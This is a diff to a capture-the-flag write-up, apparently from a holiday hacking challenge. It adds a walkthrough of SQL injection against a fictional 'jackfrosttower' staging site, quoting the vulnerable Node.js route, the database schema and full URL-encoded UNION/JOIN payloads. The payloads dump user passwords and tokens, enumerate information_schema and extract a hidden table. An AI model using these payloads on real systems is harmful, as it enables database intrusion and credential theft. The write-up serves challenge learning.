+                        'csrfToken': req.csrfToken(),
+                        'csrfTokenSearch': req.csrfToken(),
+                        'key': search,
+                        'userlogin': session.userfullname
+                    }
+                );
+
+            }
+
+        });
+
+    }else{
+        res.redirect("/login");
+    }
+
+});
+```
+
+Further investigation shows that the `/contact` page can be used to set this value if we enter the same information twice:
+
+```javascript
+app.post('/postcontact', function(req, res, next){
+    var fullname = xss( ReplaceAnyMatchingWords(req.body.fullname) );
+    var email = xss( ReplaceAnyMatchingWords( req.body.email) );
+    var phone = xss( ReplaceAnyMatchingWords( req.body.phone) );
+    var country = xss( ReplaceAnyMatchingWords( req.body.country ) );
+    var date = new Date();
+    var d = date.getDate();
+    var mo = date.getMonth();
+    var yr = date.getFullYear();
+    var current_hour = date.getHours();
+    var date_created = dateFormat(date, "yyyy-mm-dd hh:MM:ss");
+
+    tempCont.query("SELECT * from uniquecontact where email="+tempCont.escape(email), function(error, rows, fields){
+
+        if (error) {
+            console.log(error);
+            return res.sendStatus(500);
+        }
+
+        var rowlength = rows.length;
+        if (rowlength >= "1"){
+            session = req.session;
+            session.uniqueID = email;
+            req.flash('info', 'Email Already Exists');
+            res.redirect("/contact");
+
+        } else {
+
+            tempCont.query("INSERT INTO uniquecontact (full_name, email, phone, country, date_created) VALUE (?, ?, ?, ?, ?)", [fullname, email, phone, country, date_created], function(error, rows, fields) {
+
+                if (error) {
+                    console.log(error);
+                    return res.sendStatus(500);
+                }
+
+                res.render('email/e_template_1', { name: fullname }, function (err, data) {
+
+                    // setup email data with unicode symbols
+                    var mailOptions = {
+                        from: 'Admin <admin@localhost>',
+                        to: email,
+                        subject: 'Thank you for contacting us!',
+                        html: data
+                    };
+
+                    //  // send mail with defined transport object
+                    //  transporter.sendMail(mailOptions, (error, info) => {
+                    //      if (error) {
+                    //          return console.log(error);
+                    //      }
+                    //      console.log('Message sent: %s', info.messageId);
+                    //  });
+
+                    session = req.session;
+                    req.flash('info', 'Data Saved to Database!');
+                    res.redirect("/contact");
+
+                });
+
+            });
+
+        }
+
+    });
+});
+```
+
+After sending the form information in twice, we can access the `/search` page:
+
+![Frost Tower search page](./jftower_search.png)
+
+From there, we can access the `/dashboard` page, but the query is properly escaped there. The `/detail` page that we can access from here has a SQL injection vulnerability when you pass in multiple IDs like `https://staging.jackfrosttower.com/detail/957,0%20or%201=1;--`, which gives all of the users back:
+
+```javascript
+app.get('/detail/:id', function(req, res, next) {
+    session = req.session;
+    var reqparam = req.params['id'];
+    var query = "SELECT * FROM uniquecontact WHERE id=";
+
+    if (session.uniqueID){
+
+        try {
+            if (reqparam.indexOf(',') > 0){
+                var ids = reqparam.split(',');
+                reqparam = "0";
+                for (var i=0; i<ids.length; i++){
+                    query += tempCont.escape(m.raw(ids[i]));
+                    query += " OR id="
+                }
+                query += "?";
+            }else{
+                query = "SELECT * FROM uniquecontact WHERE id=?"
+            }
+        } catch (error) {
+            console.log(error);
+            return res.sendStatus(500);
+        }
+
+        tempCont.query(query, reqparam, function(error, rows, fields){
+
+            if (error) {
+                console.log(error);
+                return res.sendStatus(500);
+            }
+
+            var rowdata = rows.length;
+
+            if (rowdata == 0){
+                res.render('404',
+                    {
+                        'title': 'Not found!',
+                        'userlogin': session.userfullname
+                    }
+                );
+            }else{
+                res.render('detail',
+                    {
+                        'title': 'Detail Contact',
+                        'encontact': rows,
+                        'dateFormat': dateFormat,
+                        'csrfToken': req.csrfToken(),
+                        'userlogin': session.userfullname,
+                        'userstatus': session.userstatus
+                    }
+                );
+            }
+        });
+    }else{
+        res.redirect("/login");
+    }
+});
+```
+
+Try adding the other table to the end of the result:
+```shell
+https://staging.jackfrosttower.com/detail/957,0 or 1=1 UNION ALL select * from users;--
+```
+
+This yields an error because the second table doesn't have the same structure:
+```shell
+TypeError: /app/webpage/detail.ejs:29
+    27|                             -
+    28|                         <% }else { %>
+ >> 29|                             <%= dateFormat(encontact.date_update, "mmmm dS, yyyy h:MM:ss") %>
+    30|                         <% } %>                     
+    31|                         </li>
+    32|                     </ul>
+
+Invalid date
+    at Object.dateFormat (/app/node_modules/dateformat/lib/dateformat.js:39:17)
+    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:45:26)
+    at Array.forEach (<anonymous>)
+    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:21:18)
+    at returnedFn (/app/node_modules/ejs/lib/ejs.js:653:17)
+    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:251:36)
+    at View.exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:482:10)
+    at View.render (/app/node_modules/express/lib/view.js:135:8)
+    at tryRender (/app/node_modules/express/lib/application.js:640:10)
+    at Function.render (/app/node_modules/express/lib/application.js:592:3)
+```
+
+The provided source code shows the schema:
+```sql
+CREATE DATABASE `encontact`;
+
+USE `encontact`;
+
+/*Table structure for table `uniquecontact` */
+DROP TABLE IF EXISTS `uniquecontact`;
+
+CREATE TABLE `uniquecontact` (
+  `id` int(50) NOT NULL AUTO_INCREMENT,
+  `full_name` varchar(255) DEFAULT NULL,
+  `email` varchar(255) DEFAULT NULL,
+  `phone` varchar(50) DEFAULT NULL,
+  `country` varchar(255) DEFAULT NULL,
+  `date_created` datetime DEFAULT NULL,
+  `date_update` datetime DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=33 DEFAULT CHARSET=latin1;
+
+
+
+/*Table structure for table `users` */
+DROP TABLE IF EXISTS `users`;
+
+CREATE TABLE `users` (
+  `id` int(50) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) DEFAULT NULL,
+  `email` varchar(255) DEFAULT NULL,
+  `password` varchar(255) DEFAULT NULL,
+  `user_status` varchar(10) DEFAULT NULL,
+  `date_created` datetime DEFAULT NULL,
+  `token` varchar(255) DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
+
+
+/* Table structure for table `emails` */
+DROP TABLE IF EXISTS `emails`;
+
+CREATE TABLE `emails` (
+    `id` int(50) NOT NULL AUTO_INCREMENT,
+    `email` varchar(255) DEFAULT NULL,
+    PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+```
+
+Adding the following runs a query on the server to add data from the `users` table to the result. We can't use commas in the injection because they will be split apart by the JavaScript code, so we have to use joins:
+```sql
+0 UNION ALL SELECT * FROM (SELECT id FROM users LIMIT 10) f1 JOIN (SELECT password FROM users LIMIT 10) f2 ON f1.id = f2.password OR 1=1 JOIN (SELECT email FROM users LIMIT 10) f3 ON f1.id = f3.email OR 1=1 JOIN (SELECT user_status FROM users LIMIT 10) f4 ON f1.id = f4.user_status OR 1=1 JOIN (SELECT token FROM users LIMIT 10) f5 ON f1.id = f5.token OR 1=1 JOIN (SELECT date_created FROM users LIMIT 10) f6 ON f1.id = f6.date_created OR 1=1 JOIN (SELECT date_created FROM users LIMIT 10) f7 ON f1.id = f7.date_created OR 1=1;--
+```
+
+Submit this to the endpoint:
+```
+https://staging.jackfrosttower.com/detail/0,0%20UNION%20ALL%20SELECT%20*%20FROM%20(SELECT%20id%20FROM%20users)%20f1%20JOIN%20(SELECT%20password%20FROM%20users)%20f2%20ON%201=1%20JOIN%20(SELECT%20email%20FROM%20users)%20f3%20ON%201=1%20JOIN%20(SELECT%20user_status%20FROM%20users)%20f4%20ON%201=1%20JOIN%20(SELECT%20token%20FROM%20users)%20f5%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users)%20f6%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users)%20f7%20ON%201=1%20LIMIT%2010;--
+```
+
+This gives us back proof that the SQL injection works:
+
+![SQLi users](./sqli_users.png)
+
+Unfortunately, that information isn't what we are after. We need to take advantage of this vulnerability to extract unseen tables from the database. Note that the date columns must stay as dates to avoid JavaScript errors, so we can only play with the remaining fields. Walk through the tables to find anything interesting using the [information schema](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/information-schema-table-reference.html):
+```
+https://staging.jackfrosttower.com/detail/0,0%20UNION%20ALL%20SELECT%20*%20FROM%20(SELECT%20id%20FROM%20users%20LIMIT%201)%20f1%20JOIN%20(SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20%3E%20'emails'%20GROUP%20BY%20table_name)%20f2%20ON%201=1%20JOIN%20(SELECT%20password%20FROM%20users%20LIMIT%201)%20f3%20ON%201=1%20JOIN%20(SELECT%20user_status%20FROM%20users%20LIMIT%201)%20f4%20ON%201=1%20JOIN%20(SELECT%20token%20FROM%20users%20LIMIT%201)%20f5%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f6%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f7%20ON%201=1%20LIMIT%2010;--
+```
+
+There's a table called `todo`, which matches our objective. Let's now look at the columns available:
+```
+https://staging.jackfrosttower.com/detail/0,0%20UNION%20ALL%20SELECT%20*%20FROM%20(SELECT%20id%20FROM%20users%20LIMIT%201)%20f1%20JOIN%20(SELECT%20column_name%20FROM%20information_schema.COLUMNS%20WHERE%20table_name%20=%20'todo'%20GROUP%20BY%20column_name)%20f2%20ON%201=1%20JOIN%20(SELECT%20password%20FROM%20users%20LIMIT%201)%20f3%20ON%201=1%20JOIN%20(SELECT%20user_status%20FROM%20users%20LIMIT%201)%20f4%20ON%201=1%20JOIN%20(SELECT%20token%20FROM%20users%20LIMIT%201)%20f5%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f6%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f7%20ON%201=1%20LIMIT%2010;--
+```
+
+Now, we can see that this table has 3 columns:
+![todo table columns](./todo_table_columns.png)
+
+With one last SQL injection query, we can extract our objective:
+```
+https://staging.jackfrosttower.com/detail/0,0%20UNION%20ALL%20SELECT%20*%20FROM%20(SELECT%20id%20FROM%20users%20LIMIT%201)%20f1%20JOIN%20(SELECT%20note%20FROM%20todo)%20f2%20ON%201=1%20JOIN%20(SELECT%20password%20FROM%20users%20LIMIT%201)%20f3%20ON%201=1%20JOIN%20(SELECT%20email%20FROM%20users%20LIMIT%201)%20f4%20ON%201=1%20JOIN%20(SELECT%20token%20FROM%20users%20LIMIT%201)%20f5%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f6%20ON%201=1%20JOIN%20(SELECT%20date_created%20FROM%20users%20LIMIT%201)%20f7%20ON%201=1%20LIMIT%2010;--
+```
+
+The answer is `clerk`:
+
+![Jack's TODO list item for Santa's new job](./obj12.png)
 
 ### 13. FPGA Programming
 #### Difficulty
@@ -1545,6 +2419,9 @@ You incorrectly added 0 benign IPs to the naughty list
 * Thank you for all of your help. You are a talented defender!
 *******************************************************************
 ```
+
+### Grepping for Gold
+(Not sure where this is or how to unlock it...)
 
 ### Bonus Challenges - Log4J
 These were added on 12/21/21 at the North Pole location.
